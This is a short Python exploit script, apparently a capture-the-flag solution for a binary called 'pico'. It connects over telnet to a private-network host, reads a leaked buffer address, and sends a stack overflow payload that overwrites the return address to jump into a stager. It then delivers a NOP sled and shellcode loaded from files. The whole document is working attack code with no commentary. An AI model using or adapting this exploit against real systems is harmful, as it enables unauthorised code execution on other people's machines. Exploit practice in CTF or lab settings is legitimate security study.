#! python3

import telnetlib
import time
import struct
import sys

def pI(addr):
    return struct.pack('<I', addr)

def exploit(tn, keyword):
    s = tn.get_socket()

    with open('stager', 'rb') as f:
        stager = f.read()

    with open('shellcode_pico2', 'rb') as f:
        sc = f.read()

    s.send(b'./pico\n')
    time.sleep(0.5)

    tn.read_until(b'addr: ')
    addr_pass = int(tn.read_until(b'\n')[:-1], 16)
    print('Address of Pass: {0}'.format(hex(addr_pass)))

    payload1 = b'A'*0x1c
    payload1 += pI(addr_pass+0x20+0x8)
    payload1 += stager

    # user
    s.send(payload1 + b'\n')
    time.sleep(0.5)

    # pass
    s.send(b'A\n')

    payload2 = b''
    payload2 += b'\x90'*0x30
    payload2 += sc
    # payload2 += b'b'*0x10 
    
    s.send(payload2)
    time.sleep(0.5)
    s.send(keyword.encode() + b'\n')

    
def main(keyword):
    tn = telnetlib.Telnet('192.168.0.12', 22222)
    exploit(tn, keyword)

if __name__=='__main__':
    if (len(sys.argv) == 2):
        main(sys.argv[1])

